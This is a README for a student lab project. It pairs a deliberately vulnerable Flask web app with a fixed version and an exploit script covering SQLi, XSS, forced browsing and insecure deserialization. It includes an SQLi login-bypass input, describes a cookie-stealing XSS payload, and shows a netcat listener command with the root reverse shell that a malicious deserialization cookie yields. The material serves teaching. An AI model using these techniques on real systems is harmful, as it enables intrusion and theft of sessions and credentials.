# Vulnerable flask based web application

Project with the goal to make one web application with two versions:

- app, web application with security issues
- appsec, web application with the security issues fixed

## Vulnerabilities present

- Plaintext Passwords
- SQLi
- Forced Browsing
- XSS
- Insecure deserialization

## Usage

### To run the web application

1. Go to the desired web application directory
2. Run the following command:
    
    ```bash
    docker-compose up --build
    ```
    
3. go to the following [url](http://localhost/) 

### To run the POC (poorsploit.py)

1. Go to the project directory
2. Run the following command
    
    ```bash
    python3 poorsploit.py
    ```
    
3. Choose the exploit we want to exploit with the POC (poorsploit.py)
    
    ```bash
    python3 poorsploit.py
     ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ _________ 
    ||P |||o |||o |||r |||s |||p |||l |||o |||i |||t |||       ||
    ||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||_______||
    |/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/_______\| (Metasploit at home™️)
    
    [?] Choose one of the options:
           1 - SQli
           2 - Insecure Deserialization
           3 - XSS
           4 - Forced Browsing
           5 - quit
    > 
    ```
    

### To run go into the database

1. Check in witch container id the mysql db is running by executing the below command
    
    ```bash
    docker ps
    ```
    
2. Run the following command to get access to the mysql db
    
    ```bash
    docker exec -it <container−id> mysql -h localhost -P 3306 -u root -proot
    ```
    

## Exploitation

### SQLi

Manually:

```bash
username: <username of user we know exists>' -- \\
password: <anything>
```

Automatically:

```bash
> python3 poorsploit.py
 ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ _________ 
||P |||o |||o |||r |||s |||p |||l |||o |||i |||t |||       ||
||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||_______||
|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/_______\| (Metasploit at home™️)

[?] Choose one of the options:
       1 - SQli
       2 - Insecure Deserialization
       3 - XSS
       4 - Forced Browsing
       5 - quit
> 1
[!] Username is : root
[!] Password is: root
```

### Forced Browsing

1. Log in
2. Run the poorsploit.py to check if there are any interesting directories on the robots.txt file
3. Check out those directories mentioned

### XSS

1. Log in to post something
2. Run the poorsploit.py to get the payload we are going to post on the website
3. Just wait and see the poorsploit server output with the stolen cookies (it will repeat some)
4. Close the server when done with ctrl+c

### Insecure deserialization

1. Log in as an user to get a cookie
2. On our machine run a net cat listener for our reverse shell:
    
    ```bash
    nc -lnvp 9999
    ```
    
3. Run the poorsploit.py to get a cookie that enables us to run a reverse shell on the target machine
4. Change the cookie we have on the browser for the one we got from poorsploit.py and refresh the page
5. We get a root shell on our listener terminal like the following:
    
    ```bash
    > nc -lnvp 9999
    Connection from 172.20.0.4:49470
    bash: cannot set terminal process group (1): Inappropriate ioctl for device
    bash: no job control in this shell
    root@aca189c0881c:/app#
    ```
    

## Authors

Rodrigo Lima, nmec: 98475 <br>
Camila Fonseca, nmec: 97880 <br>
Patrícia Dias, nmec: 98546 <br>